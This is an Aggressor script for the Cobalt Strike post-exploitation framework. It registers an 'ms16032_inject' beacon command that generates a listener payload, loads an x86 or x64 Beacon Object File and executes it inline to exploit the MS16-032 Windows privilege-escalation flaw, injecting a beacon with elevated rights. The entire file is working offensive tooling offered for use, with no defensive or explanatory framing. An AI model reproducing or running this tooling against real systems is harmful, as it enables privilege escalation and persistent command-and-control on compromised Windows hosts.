# MS16-032 BOF - Direct Beacon Injection
alias ms16032_inject {
    local('$barch $handle $data $args $listener $payload');
    
    if(size(@_) < 2) {
        berror($1, "Usage: ms16032_inject <listener>");
        return;
    }
    
    $listener = $2;
    $barch = barch($1);
    
    if($barch eq "x64") {
        $payload = payload($listener, "x64", "thread");
    }
    else {
        $payload = payload($listener, "x86", "thread");
    }
    
    if(strlen($payload) == 0) {
        berror($1, "Failed to generate payload");
        return;
    }
    
    blog($1, "Generated payload for listener");
    
    if($barch eq "x64") {
        $handle = openf(script_resource("ms16032_inject.x64.o"));
    }
    else {
        $handle = openf(script_resource("ms16032_inject.x86.o"));
    }
    
    if($handle is $null) {
        berror($1, "Could not open BOF file");
        return;
    }
    
    $data = readb($handle, -1);
    closef($handle);
    
    if(strlen($data) == 0) {
        berror($1, "BOF file is empty");
        return;
    }
    
    $args = bof_pack($1, "b", $payload);
    
    btask($1, "Executing MS16-032");
    beacon_inline_execute($1, $data, "go", $args);
}

beacon_command_register("ms16032_inject", "MS16-032 LPE with beacon injection", "Usage: ms16032_inject <listener>");
